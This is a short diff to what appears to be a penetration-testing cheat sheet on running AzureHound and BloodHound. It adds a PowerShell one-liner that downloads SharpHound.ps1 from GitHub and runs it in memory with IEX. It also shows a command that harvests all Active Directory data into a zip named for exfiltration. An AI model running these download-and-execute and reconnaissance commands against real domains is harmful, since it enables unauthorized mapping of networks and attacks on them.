@@ -185,6 +185,10 @@ PS C:\> . .\AzureHound.ps1
 PS C:\> Invoke-AzureHound
 ```
 
+alternative oneliner
+
+`IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1') ; Invoke-BloodHound`
+
 2. Invoke Bloodhound on target host and harvest data
 `invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`
 
